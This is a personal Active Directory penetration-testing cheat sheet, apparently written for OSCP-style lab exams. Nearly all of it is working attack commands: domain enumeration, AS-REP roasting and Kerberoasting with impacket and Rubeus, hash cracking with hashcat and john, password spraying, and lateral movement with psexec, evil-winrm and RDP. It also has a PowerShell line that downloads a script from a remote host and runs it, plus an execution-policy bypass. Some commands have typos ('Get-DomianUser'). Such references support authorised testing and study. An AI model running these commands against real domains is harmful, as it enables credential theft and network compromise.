### Active Directory Methodology

Mindmap = https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg

AD Enumeration
	- Using net user /domain
	- PowerView (Users and Groups)

Repeated Enumeration
	- `Get-NetLoggedon | select UserName` ⇒ get all the users logged on the current machine
	- `Get-NetSession` ⇒ List of active sessions on the current machine
	- `Invoke-UserHunter -CheckAccess`  ⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers

AD Exploitation
	- Kerberoasting
	- AS-REP Roasting
	- Password Spraying using SMB/crackmapexec (after getting creds from kerberoasting/as-rep roasting)
	- Cached AD Credentials using Mimikatz

AD Lateral Movement
	- Port Forwarding / Tunneling
	- Overpass the Hash using Rubeus

Accessing AD machines
	- RDP
	- psexec
	- evil-winrm

Attack Privilege Requirements -

Kerbrute Enumeration - No domain access required
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required
Silver Ticket - Service hash required
Skeleton Key - Full domain compromise (domain admin) required


## AD Enumeration

### net commands

`net users` ⇒ display users from current local machine

`net useres /domain` ⇒ display users from the DC

`net groups /domain` ⇒ enumerate groups on the DC

 `net localgroup` ⇒ groups on the local machine

 `net localgroup administrators` ⇒ groups that have admin access on the local machine

`net group “Domain Admis” /domain` ⇒ get users within domain admin group

`net group “Client Admis” /domain` ⇒ get users within client admin group



### Enumeration using PowerView

PowerView.ps1 - https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

Load and Run PowerView.ps1 script using powershell

`IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/powerview.ps1')`


`powershell -ep bypass`  - bypass the execution policy

`Import-Module .\PowerView.ps1`  - Importing PowerView to memory

`Get-NetDomain`  - Obtaining domain information

`Get-NetUser` - Querying users in the domain

`Get-NetUser | select cn` - Querying users using select statement

`Get-NetGroup | select cn`  - Querying groups in the domain using PowerView

`Get-NetGroup "Sales Department" | select member`  - Enumerating the "Sales Department" group

`Get-NetComputer | select operatingsystem,dnshostname`  - Displaying OS and hostname

`Find-LocalAdminAccess`  - Scanning domain to find local administrative privileges for our user

https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=powerview#powerviewsharpview

`Get-DomainController`

`Get-DomianComputer | select sameaccountname, cn, name`

`Get-DomianUser | select name, memberof`  

`Get-DomainGroup | select name, member`

`Get-DomainGroupMember -Identity "Domain Admins"`

`Get-DomainGroupMember -Identity "Domain Admins" -Recurse` 

`Get-NetLoggedon | select UserName` ⇒ get all the users logged on the current machine

`Get-NetSession` ⇒ List of active sessions on the current machine

`Invoke-UserHunter -CheckAccess`  ⇒ checks if domain admin is logged onto any computers and if we have admin access to those computers

## AD Exploitation
---

### AS-REP Roasting

- On Linux -
    
    `impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete` - Using GetNPUsers to perform AS-REP roasting
    
    `hashcat --help | grep -i "Kerberos”`  - Reviewing the correct Hashcat mode
    
    `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` - Cracking the AS-REP hash with Hashcat
    
- On Windows -
    
    Rubeus - https://github.com/GhostPack/Rubeus
    
    `.\Rubeus.exe asreproast /nowrap` 
    
    `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`


### Kerberoasting
---

Kerberoasting 
⇒ Any user can get a service ticket for a service account
⇒ service ticket is encrypted using a service account hash
⇒ crack the hash using hashcat
⇒ spray password using crackmapexec



- Windows -

`.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  - Utilizing Rubeus to perform a Kerberoast attack

`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` - Cracking the TGS-REP hash

- On Linux -

`sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete` - Using impacket-GetUserSPNs to perform Kerberoasting on Linux

If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.

***Looking for Service Accounts (SPN - Service Principal Name)***

If SPN is set ⇒ It is a service account

`Get-DomainUser -SPN` ⇒ Find service accounts

`Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000`  ⇒ get hash

`hashcat -m 13100 -o cracked.txt -a 0 hashes.txt rockyou.txt` ⇒ crack the hash using hashcat


### PsExec

Sysinterals - https://learn.microsoft.com/en-us/sysinternals/

`.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`

Linux - 
`impacket-psexec oscp/emmet@10.10.1.202`  ⇒ get access to shares and shell on machine





### winrm / Evil-winrm
```sh
evil-winrm -i <IP> -u <username> -p <password>
```




### Hashcat
Crack passwords after getting hashes from AS-REP roasting or Kerberoasting
```sh
hashcat hash.asrep /usr/share /wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```


### Crack Zip files

`zip2john it-users.zip`  ⇒ gives hash of the zip file

`john it-users.hash --wordlist=/usr/share/wordlists/rockyou.txt`  ⇒ crack the hash

### Search for local.txt/proof.txt files on Windows

`dir /s/b local.txt`

`dir /s/b proof.txt` 

`dir /s/b *.txt` 

`dir /s/b *.log`


### local/proof screenshot

`type proof.txt`

`whoami`

`ipconfig`

`hostname`


=================
### Connecting to RDP

```sh
xfreerdp3 /u:<username> /d:<domain> /p:<pwd> /v:<IP>
```

```sh
xfreerdp /cert-ignore /u:<uname> /d:<domain> /p:<pwd> /v:<IP>
```

### Hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes

```sh
hashcat -m <number> hash wordlists.txt --force
```

## Active Directory

### Password Spraying

_Crackmapexec - check if the output shows 'Pwned!'_

```sh
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success
```

```sh Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### AS-REP Roasting

_Hash of AS-REP Roastable accounts_

```sh
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request
```

### Kerberoasting

_dumping from compromised windows host, and saving with customname_

```sh
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
```
